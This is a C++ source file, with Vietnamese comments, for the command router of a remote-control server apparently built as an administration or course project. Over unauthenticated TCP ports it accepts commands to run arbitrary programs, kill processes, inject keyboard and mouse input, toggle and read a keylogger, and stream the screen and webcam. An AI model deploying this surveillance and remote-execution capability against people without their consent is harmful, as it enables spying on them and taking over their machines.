// CommandRouter.cpp (FIXED: REMOVED RECORDING LOGIC)
#include "CommandRouter.h"
#include "utils/helpers.h"
#include "utils/logging.h"
#include <sstream>
#include <stdexcept>
#include <mutex>
#include <algorithm>
#include <iostream>

using namespace std;

CommandRouter::CommandRouter() {}

// Hàm xử lý lệnh (Cổng 9000)
void CommandRouter::handleCommandClient(SOCKET client)
{
    logConsole("CMD_TCP", "Gateway da ket noi Cong Lenh.");
    char buffer[4096];
    string line_buffer;

    try
    {
        while (true)
        {
            int rec = recv(client, buffer, sizeof(buffer) - 1, 0);
            if (rec <= 0)
                break;
            buffer[rec] = 0;
            line_buffer += buffer;
            size_t pos;
            while ((pos = line_buffer.find('\n')) != string::npos)
            {
                string cmdLine = line_buffer.substr(0, pos);
                line_buffer.erase(0, pos + 1);

                size_t idPos = cmdLine.find('|');
                if (idPos == string::npos)
                    continue;

                string correlationId = cmdLine.substr(0, idPos);
                string cmdOnly = cmdLine.substr(idPos + 1);

                logConsole(correlationId, "Nhan lenh: " + cmdOnly);
                vector<string> args = splitArgs(cmdOnly);
                if (args.empty())
                    continue;
                string cmd = args[0];

                // === DIEU PHOI ===

                if (cmd == "GET_PROCS")
                    sendCmdTcp(client, correlationId, "JSON " + m_processController.getProcessesJson(), m_socketMutex);
                else if (cmd == "GET_APPS")
                    sendCmdTcp(client, correlationId, "JSON " + m_appController.getAppsJson(), m_socketMutex);
                else if (cmd == "KILL_PID" && args.size() > 1)
                    sendCmdTcp(client, correlationId, "JSON " + m_processController.killProcess(args[1]), m_socketMutex);
                else if (cmd == "CLOSE_HWND" && args.size() > 1)
                    sendCmdTcp(client, correlationId, "JSON " + m_appController.closeApp(args[1]), m_socketMutex);
                else if (cmd == "START_CMD" && args.size() > 1)
                {
                    string fullCmd = cmdOnly.substr(cmd.length() + 1);
                    sendCmdTcp(client, correlationId, "JSON " + m_appController.startApp(fullCmd), m_socketMutex);
                }
                else if (cmd == "POWER_CMD" && args.size() > 1)
                    sendCmdTcp(client, correlationId, "JSON " + m_systemController.powerCommand(args[1]), m_socketMutex);

                else if (cmd == "GET_SCREENSHOT")
                    sendCmdTcp(client, correlationId, "JSON " + m_screenController.getScreenshotBase64(), m_socketMutex);
                
                else if (cmd == "INPUT_MOUSE" && args.size() > 2)
                {
                    // Args: [0]=INPUT_MOUSE, [1]=move/down/up, [2]=x/btn, [3]=y (optional)
                    string p3 = (args.size() > 3) ? args[3] : "";
                    m_systemController.handleInput("MOUSE", args[1], args[2], p3);
                    // Không cần phản hồi JSON để tối ưu tốc độ
                }
                else if (cmd == "INPUT_KEY" && args.size() > 2)
                {
                    // Args: [0]=INPUT_KEY, [1]=down/up, [2]=keycode
                    m_systemController.handleInput("KEY", args[1], args[2], "");
                }
                
                else if (cmd == "KEYLOG_SET")
                {
                    bool enable = false;
                    if (args.size() > 1) {
                        string arg = args[1];
                        arg.erase(remove_if(arg.begin(), arg.end(), ::isspace), arg.end());
                        transform(arg.begin(), arg.end(), arg.begin(), ::tolower);
                        enable = (arg == "true" || arg == "1");
                        cout << "[DEBUG] KEYLOG_SET nhan: '" << args[1] << "' -> " << (enable ? "BAT" : "TAT") << endl;

                    } else {
                        enable = false;
                        cout << "[DEBUG] KEYLOG_SET khong co tham so -> TAT" << endl;
                    }
                    
                    m_keylogController.setKeylog(enable);
                    sendCmdTcp(client, correlationId, "JSON {\"ok\":true}", m_socketMutex);
                }

                
                else if (cmd == "GET_KEYLOG")
                    sendCmdTcp(client, correlationId, "JSON " + m_keylogController.getKeylog(), m_socketMutex);
                else if (cmd == "GET_DEVICES" || cmd == "REFRESH_DEVICES")
                {
                    bool refresh = (cmd == "REFRESH_DEVICES");
                    sendCmdTcp(client, correlationId, "JSON " + m_deviceController.getDevices(refresh), m_socketMutex);
                }
                else if (cmd == "GET_SCREENSHOT")
                    sendCmdTcp(client, correlationId, "JSON " + m_screenController.getScreenshotBase64(), m_socketMutex);

                // DA XOA: RECORD_VIDEO va DELETE_VIDEO vi logic nay chuyen xuong Client
            }
        }
    }
    catch (const std::exception &e)
    {
        logConsole("CMD_TCP", "LOI: " + string(e.what()));
    }
    catch (...)
    {
        logConsole("CMD_TCP", "LOI KHONG XAC DINH!");
    }
    logConsole("CMD_TCP", "Gateway da ngat ket noi Cong Lenh.");
    closesocket(client);
}

// === 2. HAM XU LY STREAM (CONG 9001) ===
void CommandRouter::handleStreamClient(SOCKET client, string clientIP)
{
    logConsole(clientIP, "Gateway da ket noi Cong Stream.");
    char buffer[1024];
    try
    {
        int rec = recv(client, buffer, sizeof(buffer) - 1, 0);
        if (rec <= 0)
        {
            closesocket(client);
            return;
        }
        buffer[rec] = 0;
        string cmdLine(buffer);
        size_t pos = cmdLine.find('\n');
        if (pos != string::npos)
            cmdLine = cmdLine.substr(0, pos);

        vector<string> args = splitArgs(cmdLine);
        if (args.empty())
        {
            closesocket(client);
            return;
        }

        string cmd = args[0];
        logConsole(clientIP, "Nhan yeu cau Stream: " + cmd);

        if (cmd == "START_STREAM_SCREEN")
        {
            m_screenController.handleScreenStream(client, clientIP);
        }
        else if (cmd == "START_STREAM_CAM" && args.size() > 2)
        {
            // args[1] la ten camera, args[2] la audio (server bo qua audio)
            m_deviceController.handleStreamCam(client, clientIP, args[1], args[2]);
        }
    }
    catch (const std::exception &e)
    {
        logConsole(clientIP, "LOI STREAM: " + string(e.what()));
    }
    catch (...)
    {
        logConsole(clientIP, "LOI STREAM KHONG XAC DINH!");
    }

    logConsole(clientIP, "Gateway da ngat ket noi Cong Stream.");
    closesocket(client);
}